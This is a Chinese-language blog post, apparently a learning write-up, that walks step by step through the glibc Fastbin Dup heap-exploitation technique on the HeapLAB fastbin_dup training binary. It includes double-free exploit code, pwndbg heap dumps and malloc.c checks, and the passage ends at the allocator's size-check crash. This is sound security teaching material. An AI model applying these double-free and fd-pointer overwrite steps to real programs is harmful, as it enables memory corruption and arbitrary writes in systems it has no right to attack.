<!doctype html>
<html lang="zh"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>glibc 利用之Fastbin Dup - avcatshy</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="avcatshy"><meta name="msapplication-TileImage" content="https://avatars.githubusercontent.com/u/20829507?s=60&amp;v=4"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="avcatshy"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="针对fastbin，利用double free在两次malloc 时获得同一个块chunk，然后在第一次拿到chunk后修改堆的结构，将假的chunk链接到当前块，之后可以通过malloc分配到假的chunk，从而实现任意地址读写，这就是所谓的Fastbin Dup。"><meta property="og:type" content="blog"><meta property="og:title" content="glibc 利用之Fastbin Dup"><meta property="og:url" content="https://avcatshy.github.io/2020/12/27/glibc%E5%88%A9%E7%94%A8%E4%B9%8BFastbinDup/"><meta property="og:site_name" content="avcatshy"><meta property="og:description" content="针对fastbin，利用double free在两次malloc 时获得同一个块chunk，然后在第一次拿到chunk后修改堆的结构，将假的chunk链接到当前块，之后可以通过malloc分配到假的chunk，从而实现任意地址读写，这就是所谓的Fastbin Dup。"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://avcatshy.github.io/img/og_image.png"><meta property="article:published_time" content="2020-12-28T06:20:07.377Z"><meta property="article:modified_time" content="2020-12-28T06:22:33.599Z"><meta property="article:author" content="vlinkstone"><meta property="article:tag" content="Bin"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="/img/og_image.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://avcatshy.github.io/2020/12/27/glibc%E5%88%A9%E7%94%A8%E4%B9%8BFastbinDup/"},"headline":"glibc 利用之Fastbin Dup","image":["https://avcatshy.github.io/img/og_image.png"],"datePublished":"2020-12-28T06:20:07.377Z","dateModified":"2020-12-28T06:22:33.599Z","author":{"@type":"Person","name":"vlinkstone"},"publisher":{"@type":"Organization","name":"avcatshy","logo":{"@type":"ImageObject","url":"https://avatars.githubusercontent.com/u/20829507?s=60&v=4"}},"description":"针对fastbin，利用double free在两次malloc 时获得同一个块chunk，然后在第一次拿到chunk后修改堆的结构，将假的chunk链接到当前块，之后可以通过malloc分配到假的chunk，从而实现任意地址读写，这就是所谓的Fastbin Dup。"}</script><link rel="canonical" href="https://avcatshy.github.io/2020/12/27/glibc%E5%88%A9%E7%94%A8%E4%B9%8BFastbinDup/"><link rel="icon" href="https://avatars.githubusercontent.com/u/20829507?s=60&amp;v=4"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.15.2/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css"><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script><!--!--><!--!--><meta name="generator" content="Hexo 5.4.0"></head><body class="is-3-column"><nav class="navbar navbar-main"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="https://avatars.githubusercontent.com/u/20829507?s=60&amp;v=4" alt="avcatshy" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/2020/02/02/about/">About</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/avcatshy"><i class="fab fa-github"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-9-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2020-12-28T06:20:07.377Z" title="12/27/2020, 10:20:07 PM">2020-12-27</time>发表</span><span class="level-item"><time dateTime="2020-12-28T06:22:33.599Z" title="12/27/2020, 10:22:33 PM">2020-12-27</time>更新</span><span class="level-item"><a class="link-muted" href="/categories/BIN/">BIN</a></span><span class="level-item">28 分钟读完 (大约4162个字)</span></div></div><h1 class="title is-3 is-size-4-mobile">glibc 利用之Fastbin Dup</h1><div class="content"><!-- # glibc 利用之Fastbin Dup -->

<p>针对fastbin，利用double free在两次malloc 时获得同一个块chunk，然后在第一次拿到chunk后修改堆的结构，将假的chunk链接到当前块，之后可以通过malloc分配到假的chunk，从而实现任意地址读写，这就是所谓的Fastbin Dup。</p>
<span id="more"></span>

<p>这里拿HeapLab中的fastbin_dup 当例子，逐步分析。运行程序可以看到主窗口，先输入用户名，之后可以malloc、free以及查看target。    </p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">x@ubuntu  fastbin_dup  ./fastbin_dup </span><br><span class="line">===============</span><br><span class="line">|   HeapLAB   |  Fastbin Dup</span><br><span class="line">===============</span><br><span class="line">puts() @ <span class="number">0x7f5f61acaaf0</span></span><br><span class="line">Enter your username: FastbinDup</span><br><span class="line"><span class="number">1</span>) malloc <span class="number">0</span>/<span class="number">7</span></span><br><span class="line"><span class="number">2</span>) free</span><br><span class="line"><span class="number">3</span>) target</span><br><span class="line"><span class="number">4</span>) quit</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>

<p>既然利用需要double free，那就先试试double free （实际做题时，可以盲测或者直接用ida 看free后有没有置空）， 直接malloc 一次free 两次，结果报错了：double free or corruption (fasttop) Program received signal SIGABRT, Aborted.</p>
<p>看下原因：</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">─────────────────────────────────[ BACKTRACE ]──────────────────────────────────</span><br><span class="line"> ► f <span class="number">0</span>     7ffff7a5204a raise+<span class="number">202</span></span><br><span class="line">   f <span class="number">1</span>     7ffff7a530f5 abort+<span class="number">357</span></span><br><span class="line">   f <span class="number">2</span>     7ffff7a93f07 __libc_message+<span class="number">599</span></span><br><span class="line">   f <span class="number">3</span>     7ffff7a9b2aa</span><br><span class="line">   f <span class="number">4</span>     7ffff7a9ccb4 _int_free+<span class="number">948</span></span><br><span class="line">   f <span class="number">5</span>           400a22 main+<span class="number">603</span></span><br><span class="line">   f <span class="number">6</span>     7ffff7a3e037 __libc_start_main+<span class="number">231</span></span><br><span class="line">────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; f <span class="number">4</span></span><br><span class="line">#<span class="number">4</span>  <span class="number">0x00007ffff7a9ccb4</span> <span class="keyword">in</span> _int_free (av=<span class="number">0x7ffff7dd0b60</span> &lt;main_arena&gt;, p=<span class="number">0x603000</span>, have_lock=<span class="number">0</span>) at malloc.c:<span class="number">4266</span></span><br><span class="line"><span class="number">4266</span>		  malloc_printerr (<span class="string">&quot;double free or corruption (fasttop)&quot;</span>);</span><br><span class="line">pwndbg&gt; context code</span><br><span class="line"><span class="attr">LEGEND</span>: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">───────────────────────────────[ SOURCE (CODE) ]────────────────────────────────</span><br><span class="line">In file: <span class="regexp">/home/</span>x/.glibc/glibc_2.30_no-tcache/malloc/malloc.c</span><br><span class="line">   <span class="number">4261</span>     <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">   <span class="number">4262</span>       &#123;</span><br><span class="line">   <span class="number">4263</span> 	<span class="comment">/* Check that the top of the bin is not the record we are going to</span></span><br><span class="line"><span class="comment">   4264 	   add (i.e., double free).  */</span></span><br><span class="line">   <span class="number">4265</span> 	<span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line"> ► <span class="number">4266</span> 	  malloc_printerr (<span class="string">&quot;double free or corruption (fasttop)&quot;</span>);</span><br><span class="line">   <span class="number">4267</span> 	p-&gt;fd = old;</span><br><span class="line">   <span class="number">4268</span> 	*fb = p;</span><br><span class="line">   <span class="number">4269</span>       &#125;</span><br><span class="line">   <span class="number">4270</span>     <span class="keyword">else</span></span><br><span class="line">   <span class="number">4271</span>       <span class="keyword">do</span></span><br><span class="line">────────────────────────────────────────────────────────────────────────────────</span><br></pre></td></tr></table></figure>

<p>根据代码的注释可以看到，malloc 中的_int_free 函数会检查我们释放后要添加进fastbin中的chunk是否已经是fastbin中的第一个bin，是则提示double free，否则就通过检查。ok，既然如此我们就不用第一个bin试试看：</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">io.sendafter(<span class="string">&quot;username: &quot;</span>, <span class="string">&quot;FastbinDup&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">chunk_A = malloc(<span class="number">0x68</span>, <span class="string">&quot;A&quot;</span>*<span class="number">0x68</span>)</span><br><span class="line">chunk_B = malloc(<span class="number">0x68</span>, <span class="string">&quot;B&quot;</span>*<span class="number">0x68</span>)</span><br><span class="line">input(<span class="string">&quot;after malloc&quot;</span>)</span><br><span class="line">free(chunk_A)</span><br><span class="line">free(chunk_B)</span><br><span class="line">input(<span class="string">&quot;after free normal&quot;</span>)</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">pwndbg&gt; vis</span><br><span class="line"><span class="number">0x11a2000</span>	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000071</span>	........q.......</span><br><span class="line"><span class="number">0x11a2010</span>	<span class="number">0x4141414141414141</span>	<span class="number">0x4141414141414141</span>	AAAAAAAAAAAAAAAA</span><br><span class="line"><span class="number">0x11a2020</span>	<span class="number">0x4141414141414141</span>	<span class="number">0x4141414141414141</span>	AAAAAAAAAAAAAAAA</span><br><span class="line"><span class="number">0x11a2030</span>	<span class="number">0x4141414141414141</span>	<span class="number">0x4141414141414141</span>	AAAAAAAAAAAAAAAA</span><br><span class="line"><span class="number">0x11a2040</span>	<span class="number">0x4141414141414141</span>	<span class="number">0x4141414141414141</span>	AAAAAAAAAAAAAAAA</span><br><span class="line"><span class="number">0x11a2050</span>	<span class="number">0x4141414141414141</span>	<span class="number">0x4141414141414141</span>	AAAAAAAAAAAAAAAA</span><br><span class="line"><span class="number">0x11a2060</span>	<span class="number">0x4141414141414141</span>	<span class="number">0x4141414141414141</span>	AAAAAAAAAAAAAAAA</span><br><span class="line"><span class="number">0x11a2070</span>	<span class="number">0x4141414141414141</span>	<span class="number">0x0000000000000071</span>	AAAAAAAAq.......</span><br><span class="line"><span class="number">0x11a2080</span>	<span class="number">0x4242424242424242</span>	<span class="number">0x4242424242424242</span>	BBBBBBBBBBBBBBBB</span><br><span class="line"><span class="number">0x11a2090</span>	<span class="number">0x4242424242424242</span>	<span class="number">0x4242424242424242</span>	BBBBBBBBBBBBBBBB</span><br><span class="line"><span class="number">0x11a20a0</span>	<span class="number">0x4242424242424242</span>	<span class="number">0x4242424242424242</span>	BBBBBBBBBBBBBBBB</span><br><span class="line"><span class="number">0x11a20b0</span>	<span class="number">0x4242424242424242</span>	<span class="number">0x4242424242424242</span>	BBBBBBBBBBBBBBBB</span><br><span class="line"><span class="number">0x11a20c0</span>	<span class="number">0x4242424242424242</span>	<span class="number">0x4242424242424242</span>	BBBBBBBBBBBBBBBB</span><br><span class="line"><span class="number">0x11a20d0</span>	<span class="number">0x4242424242424242</span>	<span class="number">0x4242424242424242</span>	BBBBBBBBBBBBBBBB</span><br><span class="line"><span class="number">0x11a20e0</span>	<span class="number">0x4242424242424242</span>	<span class="number">0x0000000000020f21</span>	BBBBBBBB!....... &lt;-- Top chunk</span><br><span class="line">pwndbg&gt; fastbins </span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">...</span><br><span class="line">pwndbg&gt; vis</span><br><span class="line"><span class="number">0x11a2000</span>	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000071</span>	........q....... &lt;-- fastbins[<span class="number">0x70</span>][<span class="number">1</span>]</span><br><span class="line"><span class="number">0x11a2010</span>	<span class="number">0x0000000000000000</span>	<span class="number">0x4141414141414141</span>	........AAAAAAAA</span><br><span class="line"><span class="number">0x11a2020</span>	<span class="number">0x4141414141414141</span>	<span class="number">0x4141414141414141</span>	AAAAAAAAAAAAAAAA</span><br><span class="line"><span class="number">0x11a2030</span>	<span class="number">0x4141414141414141</span>	<span class="number">0x4141414141414141</span>	AAAAAAAAAAAAAAAA</span><br><span class="line"><span class="number">0x11a2040</span>	<span class="number">0x4141414141414141</span>	<span class="number">0x4141414141414141</span>	AAAAAAAAAAAAAAAA</span><br><span class="line"><span class="number">0x11a2050</span>	<span class="number">0x4141414141414141</span>	<span class="number">0x4141414141414141</span>	AAAAAAAAAAAAAAAA</span><br><span class="line"><span class="number">0x11a2060</span>	<span class="number">0x4141414141414141</span>	<span class="number">0x4141414141414141</span>	AAAAAAAAAAAAAAAA</span><br><span class="line"><span class="number">0x11a2070</span>	<span class="number">0x4141414141414141</span>	<span class="number">0x0000000000000071</span>	AAAAAAAAq....... &lt;-- fastbins[<span class="number">0x70</span>][<span class="number">0</span>]</span><br><span class="line"><span class="number">0x11a2080</span>	<span class="number">0x00000000011a2000</span>	<span class="number">0x4242424242424242</span>	. ......BBBBBBBB</span><br><span class="line"><span class="number">0x11a2090</span>	<span class="number">0x4242424242424242</span>	<span class="number">0x4242424242424242</span>	BBBBBBBBBBBBBBBB</span><br><span class="line"><span class="number">0x11a20a0</span>	<span class="number">0x4242424242424242</span>	<span class="number">0x4242424242424242</span>	BBBBBBBBBBBBBBBB</span><br><span class="line"><span class="number">0x11a20b0</span>	<span class="number">0x4242424242424242</span>	<span class="number">0x4242424242424242</span>	BBBBBBBBBBBBBBBB</span><br><span class="line"><span class="number">0x11a20c0</span>	<span class="number">0x4242424242424242</span>	<span class="number">0x4242424242424242</span>	BBBBBBBBBBBBBBBB</span><br><span class="line"><span class="number">0x11a20d0</span>	<span class="number">0x4242424242424242</span>	<span class="number">0x4242424242424242</span>	BBBBBBBBBBBBBBBB</span><br><span class="line"><span class="number">0x11a20e0</span>	<span class="number">0x4242424242424242</span>	<span class="number">0x0000000000020f21</span>	BBBBBBBB!....... &lt;-- Top chunk</span><br><span class="line">pwndbg&gt; fastbins </span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x11a2070</span> —▸ <span class="number">0x11a2000</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>

<p>正常的malloc 和free后，可以看到两个chunk都被放进了大小为0x70的fastbin中，且后free的在前面，也就是后入先出。那我们触发double free就free chunk_A 好了，试试看：</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">free(chunk_A)</span><br><span class="line">input(<span class="string">&quot;after double free&quot;</span>)</span><br><span class="line">---</span><br><span class="line">pwndbg&gt; vis</span><br><span class="line"><span class="number">0x11a2000</span>	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000071</span>	........q.......	 &lt;-- fastbins[<span class="number">0x70</span>][<span class="number">0</span>], fastbins[<span class="number">0x70</span>][<span class="number">0</span>]</span><br><span class="line"><span class="number">0x11a2010</span>	<span class="number">0x00000000011a2070</span>	<span class="number">0x4141414141414141</span>	p ......AAAAAAAA</span><br><span class="line"><span class="number">0x11a2020</span>	<span class="number">0x4141414141414141</span>	<span class="number">0x4141414141414141</span>	AAAAAAAAAAAAAAAA</span><br><span class="line"><span class="number">0x11a2030</span>	<span class="number">0x4141414141414141</span>	<span class="number">0x4141414141414141</span>	AAAAAAAAAAAAAAAA</span><br><span class="line"><span class="number">0x11a2040</span>	<span class="number">0x4141414141414141</span>	<span class="number">0x4141414141414141</span>	AAAAAAAAAAAAAAAA</span><br><span class="line"><span class="number">0x11a2050</span>	<span class="number">0x4141414141414141</span>	<span class="number">0x4141414141414141</span>	AAAAAAAAAAAAAAAA</span><br><span class="line"><span class="number">0x11a2060</span>	<span class="number">0x4141414141414141</span>	<span class="number">0x4141414141414141</span>	AAAAAAAAAAAAAAAA</span><br><span class="line"><span class="number">0x11a2070</span>	<span class="number">0x4141414141414141</span>	<span class="number">0x0000000000000071</span>	AAAAAAAAq.......	 &lt;-- fastbins[<span class="number">0x70</span>][<span class="number">1</span>]</span><br><span class="line"><span class="number">0x11a2080</span>	<span class="number">0x00000000011a2000</span>	<span class="number">0x4242424242424242</span>	. ......BBBBBBBB</span><br><span class="line"><span class="number">0x11a2090</span>	<span class="number">0x4242424242424242</span>	<span class="number">0x4242424242424242</span>	BBBBBBBBBBBBBBBB</span><br><span class="line"><span class="number">0x11a20a0</span>	<span class="number">0x4242424242424242</span>	<span class="number">0x4242424242424242</span>	BBBBBBBBBBBBBBBB</span><br><span class="line"><span class="number">0x11a20b0</span>	<span class="number">0x4242424242424242</span>	<span class="number">0x4242424242424242</span>	BBBBBBBBBBBBBBBB</span><br><span class="line"><span class="number">0x11a20c0</span>	<span class="number">0x4242424242424242</span>	<span class="number">0x4242424242424242</span>	BBBBBBBBBBBBBBBB</span><br><span class="line"><span class="number">0x11a20d0</span>	<span class="number">0x4242424242424242</span>	<span class="number">0x4242424242424242</span>	BBBBBBBBBBBBBBBB</span><br><span class="line"><span class="number">0x11a20e0</span>	<span class="number">0x4242424242424242</span>	<span class="number">0x0000000000020f21</span>	BBBBBBBB!.......	 &lt;-- Top chunk</span><br><span class="line">pwndbg&gt; fastbins </span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x11a2000</span> —▸ <span class="number">0x11a2070</span> ◂— <span class="number">0x11a2000</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br></pre></td></tr></table></figure>

<p>ok，看起来第一步已经实现了，成功布局chunk_A → chunk_B ← chunk_A ，接下来应该是将fake 地址链接到当前的fastbin中，先试试将user 的地址拉过来：</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">dup=malloc(<span class="number">0x68</span>, p64(elf.sym.user))</span><br><span class="line">input(<span class="string">&quot;malloc for user addr&quot;</span>)</span><br><span class="line">---</span><br><span class="line">pwndbg&gt; ptype user</span><br><span class="line">type = struct user &#123;</span><br><span class="line">    char username[<span class="number">16</span>];</span><br><span class="line">    char target[<span class="number">16</span>];</span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; p user</span><br><span class="line">$<span class="number">1</span> = &#123;</span><br><span class="line">  username = <span class="string">&quot;FastbinDup\000\000\000\000\000&quot;</span>,</span><br><span class="line">  target = <span class="string">&quot;XXXXXXX\000\000\000\000\000\000\000\000&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; fastbins </span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x1e81000</span> —▸ <span class="number">0x1e81070</span> ◂— <span class="number">0x1e81000</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line">^C</span><br><span class="line">pwndbg&gt; fastbins </span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x1e81070</span> —▸ <span class="number">0x1e81000</span> —▸ <span class="number">0x602010</span> (user) ◂— <span class="number">0x58585858585858</span> <span class="comment">/* &#x27;XXXXXXX&#x27; */</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>

<p>看起来比较顺利，我们通过malloc后得到chunk_A， 之后将chunk_A中的fd指针指向user的地址，从而将user链入当前的bin中。后面如果能够成功的在user地址中写入内容，就算实现任意地址写了呗。</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">input(<span class="string">&quot;malloc for user addr&quot;</span>)</span><br><span class="line">malloc(<span class="number">0x68</span>,<span class="string">&quot;C&quot;</span>*<span class="number">0x68</span>)</span><br><span class="line">malloc(<span class="number">0x68</span>,<span class="string">&quot;D&quot;</span>*<span class="number">0x68</span>)</span><br><span class="line">malloc(<span class="number">0x68</span>,<span class="string">&quot;arbitrary write&quot;</span>)</span><br><span class="line">---</span><br><span class="line">malloc(): memory corruption (fast)</span><br></pre></td></tr></table></figure>

<p>看来没那么简单，这里直接崩了，ummm， 看看原因：</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">─────────────────────────────────[ BACKTRACE ]──────────────────────────────────</span><br><span class="line"> ► f <span class="number">0</span>     7f7b237b604a raise+<span class="number">202</span></span><br><span class="line">   f <span class="number">1</span>     7f7b237b70f5 abort+<span class="number">357</span></span><br><span class="line">   f <span class="number">2</span>     7f7b237f7f07 __libc_message+<span class="number">599</span></span><br><span class="line">   f <span class="number">3</span>     7f7b237ff2aa</span><br><span class="line">   f <span class="number">4</span>     7f7b2380235c _int_malloc+<span class="number">2028</span></span><br><span class="line">   f <span class="number">5</span>     7f7b23803533 malloc+<span class="number">51</span></span><br><span class="line">   f <span class="number">6</span>           <span class="number">400976</span> main+<span class="number">431</span></span><br><span class="line">   f <span class="number">7</span>     7f7b237a2037 __libc_start_main+<span class="number">231</span></span><br><span class="line">────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; f <span class="number">4</span></span><br><span class="line">#<span class="number">4</span>  <span class="number">0x00007f7b2380235c</span> <span class="keyword">in</span> _int_malloc (av=av@entry=<span class="number">0x7f7b23b34b60</span> &lt;main_arena&gt;, bytes=bytes@entry=<span class="number">104</span>) at malloc.c:<span class="number">3594</span></span><br><span class="line"><span class="number">3594</span>			malloc_printerr (<span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>);</span><br><span class="line">pwndbg&gt; context code</span><br><span class="line"><span class="attr">LEGEND</span>: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">───────────────────────────────[ SOURCE (CODE) ]────────────────────────────────</span><br><span class="line">In file: <span class="regexp">/home/</span>x/.glibc/glibc_2.30_no-tcache/malloc/malloc.c</span><br><span class="line">   <span class="number">3589</span> 	    REMOVE_FB (fb, pp, victim);</span><br><span class="line">   <span class="number">3590</span> 	  <span class="keyword">if</span> (__glibc_likely (victim != NULL))</span><br><span class="line">   <span class="number">3591</span> 	    &#123;</span><br><span class="line">   <span class="number">3592</span> 	      size_t victim_idx = fastbin_index (chunksize (victim));</span><br><span class="line">   <span class="number">3593</span> 	      <span class="keyword">if</span> (__builtin_expect (victim_idx != idx, <span class="number">0</span>))</span><br><span class="line"> ► <span class="number">3594</span> 		malloc_printerr (<span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>);</span><br><span class="line">   <span class="number">3595</span> 	      check_remalloced_chunk (av, victim, nb);</span><br><span class="line">   <span class="number">3596</span> #<span class="keyword">if</span> USE_TCACHE</span><br><span class="line">   <span 